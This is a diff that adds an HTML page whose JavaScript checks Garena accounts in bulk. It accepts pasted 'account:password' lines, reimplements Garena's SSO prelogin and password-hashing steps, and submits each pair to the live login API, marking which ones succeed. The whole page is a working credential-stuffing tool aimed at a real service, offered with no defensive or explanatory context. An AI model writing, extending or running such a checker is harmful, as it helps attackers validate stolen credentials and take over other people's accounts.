@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Login</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.js"></script>
+</head>
+<body>
+
+    <h1>Account Login Processing</h1>
+
+    <label for="accountsInput">Enter Account List (Format: account:password)</label>
+    <textarea id="accountsInput" rows="10" cols="30"></textarea>
+
+    <br>
+
+    <button onclick="processAccounts()">Process Accounts</button>
+
+    <h3>Results:</h3>
+    <pre id="results"></pre>
+
+    <script>
+        // Helper function to perform MD5 hash
+        function md5(password) {
+            return CryptoJS.MD5(password).toString(CryptoJS.enc.Hex);
+        }
+
+        // Function to hash passwords
+        function hashPassword(password, v1, v2) {
+            const passMd5 = md5(password);
+            const innerHash = CryptoJS.SHA256(passMd5 + v1).toString(CryptoJS.enc.Hex);
+            const outerHash = CryptoJS.SHA256(innerHash + v2).toString(CryptoJS.enc.Hex);
+            const key = CryptoJS.enc.Hex.parse(outerHash);
+            const ciphertext = CryptoJS.AES.encrypt(passMd5 + "0".repeat(32), key, { mode: CryptoJS.mode.ECB }).toString();
+            return ciphertext.substring(0, 32); // Return first 32 characters
+        }
+
+        // Prelogin function
+        async function prelogin(account) {
+            const url = "https://sso.garena.com/api/prelogin";
+            const params = {
+                app_id: "10100",
+                account: account,
+                format: "json"
+            };
+
+            try {
+                const response = await fetch(`${url}?${new URLSearchParams(params)}`);
+                const data = await response.json();
+                return { v1: data.v1, v2: data.v2 };
+            } catch (error) {
+                console.error("Prelogin Error:", error);
+                return null;
+            }
+        }
+
+        // Login function
+        async function login(account, password, v1, v2) {
+            const url = "https://sso.garena.com/api/login";
+            const hashedPassword = hashPassword(password, v1, v2);
+            const params = {
+                app_id: "10100",
+                account: account,
+                password: hashedPassword,
+                format: "json"
+            };
+
+            try {
+                const response = await fetch(`${url}?${new URLSearchParams(params)}`);
+                const data = await response.json();
+                return data.sso_key;
+            } catch (error) {
+                console.error("Login Error:", error);
+                return null;
+            }
+        }
+
+        // Main processing function
+        async function processAccount(account, password) {
+            const { v1, v2 } = await prelogin(account);
+            if (!v1 || !v2) {
+                return `${account}: Failed (Prelogin Error)`;
+            }
+
+            const ssoKey = await login(account, password, v1, v2);
+            if (!ssoKey) {
+                return `${account}: Failed (Login Error)`;
+            }
+
+            return `${account}: Success`;
+        }
+
+        // Function to handle multiple account processing
+        async function processAccounts() {
+            const accountsInput = document.getElementById('accountsInput').value.trim();
+            const accounts = accountsInput.split('\n').map(line => line.split(':')).filter(account => account.length === 2);
+
+            const results = [];
+            for (let [account, password] of accounts) {
+                const result = await processAccount(account, password);
+                results.push(result);
+            }
+
+            // Display the results
+            document.getElementById('results').textContent = results.join('\n');
+        }
+    </script>
+
+</body>
+</html>
